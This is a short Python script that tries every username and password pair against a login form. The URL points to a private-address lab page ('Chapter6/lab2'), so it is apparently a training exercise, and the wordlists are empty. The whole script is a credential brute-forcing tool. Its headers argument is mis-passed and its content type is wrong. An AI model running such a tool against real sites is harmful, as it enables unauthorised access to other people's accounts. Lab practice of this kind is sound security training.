import requests
import json
from requests.sessions import Session

url = "http://192.168.15.205/Decamp/Chapter6/lab2/login.php"

# Create a session object to persist cookies
session = Session()

# Explicitly set the header if needed (usually not necessary for x-www-form-urlencoded)
headers = {
    'Content-Type': 'application/form-data'
}

# Example lists of usernames and passwords
usernames = [

]

passwords = [

]

successful_logins = []

for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password,
            "submit": "Login"
        }
        # Send the POST request with the form data
        response = session.post(url, data, headers)
        
        # Checking for a specific pattern in the response to indicate successful login. Change to expected result
        if "<title>Welcome Home" in response.text:
            print(f"Success with username: {username} and password: {password}")
            # Optionally, break out of the loop or perform additional actions upon success
            successful_logins.append((username, password))
        else:
            print(f"Failed attempt with username: {username} and password: {password}")

# Print all successful login combinations at the end
if successful_logins:
    print("\nSuccessful login combinations found:")
    for username, password in successful_logins:
        print(f"Username: {username}, Password: {password}")
else:
    print("No successful login combinations found.")
